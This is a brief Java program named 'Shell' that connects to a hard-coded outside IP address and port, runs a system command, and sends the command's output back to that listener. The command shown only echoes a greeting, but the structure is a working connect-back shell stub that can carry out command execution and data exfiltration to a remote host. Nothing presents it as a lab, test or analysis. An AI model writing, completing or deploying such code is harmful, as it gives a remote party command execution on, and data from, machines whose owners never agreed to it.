import java.io.*;
import java.net.*;

public class Shell {

    public static void main(String[] args) throws Exception {

        // Set the listener's IP address and port number
        String listener_ip = "62.171.160.234";
        int listener_port = 8888;

        // Create a socket object
        Socket socket = new Socket(listener_ip, listener_port);

        // Execute the command
        String command = "echo \"Hello, World!\"";
        Process process = Runtime.getRuntime().exec(command);

        // Send the result back to the listener
        BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
        PrintWriter writer = new PrintWriter(socket.getOutputStream(), true);
        String line;
        while ((line = reader.readLine()) != null) {
            writer.println(line);
        }

        // Close the socket connection
        socket.close();

    }

}